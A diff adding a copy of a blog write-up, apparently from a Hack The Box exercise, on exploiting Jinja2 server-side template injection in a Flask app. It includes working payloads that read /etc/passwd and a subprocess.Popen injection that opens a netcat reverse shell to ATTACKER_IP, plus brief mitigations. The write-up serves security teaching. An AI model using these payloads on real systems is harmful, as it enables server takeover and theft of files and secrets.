@@ -1,0 +1,91 @@
+RCE with Server-Side Template Injection
+
+##
+##
+## https://medium.com/r3d-buck3t/rce-with-server-side-template-injection-b9c5959ad31e
+##
+##
+
+Python Flask Application with Jinja2 Template — Doctor HTB machine
+https://unsplash.com/photos/0P18_RI36yE — Simone Viani
+
+Server-side template injection is a web application vulnerability that occurs in template-generated applications. User inputs get embedded dynamically into the template variables and rendered on the web pages. Like any injection, the leading cause of this is unsensitized inputs; we trust the users to be sensible and use the application as intended without taking the proper measures to prevent malicious actions.
+
+Modern template engines are more complex and support various functionalities that allow developers to interact with the back-end directly from the template. Though template engines generally have sandboxes for code execution as a protection mechanism, it is possible to escape the sandbox and execute arbitrary code on the underlying server.
+
+Today’s post will go over a vulnerable Python Flask application that runs Jinja2 engine vulnerable to server-side template injection. We exploit the vulnerability and escalate it to a remote code execution to take over the machine. The attacking steps are demonstrated on the Doctor machine from hack the box.
+
+Let’s start 🏃 🏃
+$_Detection_Steps
+
+For our enumeration phase, we will follow the below steps to identify the vulnerability:
+
+    Identify the application’s built-in language and the running template engine.
+    Identify injectable user-controlled inputs in GET and POST requests.
+    Fuzz the application with special characters ${{<%[%'"}}%\. Observe which ones get interpreted by the server and which ones raise errors.
+    Insert basic template injection payloads in all user inputs, and observe if the application engine evaluates them.
+
+The application we are testing is written in Python and runs the Jinja2 template. A quick search in PayloadsAllTheThings on GitHub, we found a basic payload of {{7*7}}. I injected all the inputs with the payload and analyzed the responses.
+Injection Example in GET requests
+Injecting URLs with SSTI payload
+Injection Example in POST requests
+Injecting SSTI payload in a POST request parameters
+
+The application didn’t return any interesting response except for the title parameter in the posting functionality “New Message.” The injected payload was evaluated and reflected in another endpoint — Archive.
+
+I found the endpoint when reviewing the directory enumeration scans started at the beginning of the test.
+Archive Ednpoint
+
+The Archive endpoint lists all created posts in XML format. As we see in the below screenshot, the injected payload was evaluated as 49. At this point, I confirmed that the title parameter is vulnerable.
+Archive Endpoint
+
+Now that we found the vulnerable parameter, let’s try to read sensitive files like the /etc/passwd file (the application is running on a Linux machine) with the open function payload.
+
+{{ get_flashed_messages.__globals__.__builtins__.open("/etc/passwd").read() }}
+
+Injecting the post title with reading payload
+
+After submitting the post, we go to the Archie endpoint, and voila, we see the content of the passwd file presented to us.
+/etc/paswd content
+$_Remote_Code_Execution
+
+Now that we have identified the SSTI vulnerability in the posting functionality, it is time to roll-up our selves and escalate it.
+
+Our goal is to get code execution and to do so, we need to enumerate all items in the Flask configuration object (Config Object) to find the right item to call. The Config items are usually stored in the form of a global dictionary (dict_items). The class that provides command execution attributes is in the OS module — Subprocess.Popen class.
+
+Finding the class is a bit tricky in the Flask framework and needs some digging to get to it. By default, when injecting the vulnerable application with {{config.items()}}, it would return only the global attributes that exist in the current Python environment, such as the app environment, sensitive information about the database connections, secret keys, credentials, running services, etc.
+config.items()
+
+Any other attributes needed from other libraries must first be loaded to the global Config object to be callable. To call the “Subprocess.Popen” class, we need to load the OS module before using it. We can do that with the “from_object” method {{ config.from_object('os') }}*.
+
+When inserting{{config.items()}} again; you will see the OS methods like WIFCONTINUED, WEXITSTATUS ) are added in the global Config object as items.
+OS methods added
+
+Next, we search for the Subprocess class in the Config object with the MRO — Method Resolution Order (MRO). MRO is an algorithmic way of defining the class search path to search for the right method in all inherited classes and subclasses of an object.
+
+We start at the object’s root — Index [1] and list all available classes with the subclasses keyword.
+
+{{ "".__class__.__mro__[1].__subclasses__() }}
+
+inherited classes
+
+As we see, there are 784 inherited classes. So, to select the “subprocess.Popen” class, we need to get the index number of the class. We can do that with the index method, in which we pass the class name and returns its position in the array. (array name is this example is test)
+
+print (test.index("class subprocess.Popen"))
+
+We get “407” as the index number of the “subprocess.Popen” class by running the above method. Great!!
+
+Now, into the good stuff. First, create a new post, inject the title parameter with the netcat shell command, and set up a local listener in the attacking machine to listen for connections.
+
+{{''.__class__.__mro__[1].__subclasses__()[407] ('rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc ATTACKER_IP LISENTING_PORT >/tmp/f',shell=True,stdout=-1).communicate()}}
+
+After submitting the post, we trigger the shell by going to the Archive endpoint to get the connection. 😈
+netcat shell as the Web user
+$_Mitigation
+
+    Sanitize user inputs before passing them into the templates.
+    Sandboxing: execute user’s code in a sandboxed environment; though some of these environments can be bypassed, they are still considered a protection mechanism to reduce the risk of the SSTI vulnerability.
+
+That’s all for today. Thanks for reading !!
+
+🔔 All the commands used in this post can be found at R3d-Buck3T — Notion (Web Application Testing — Injection-SSTI)
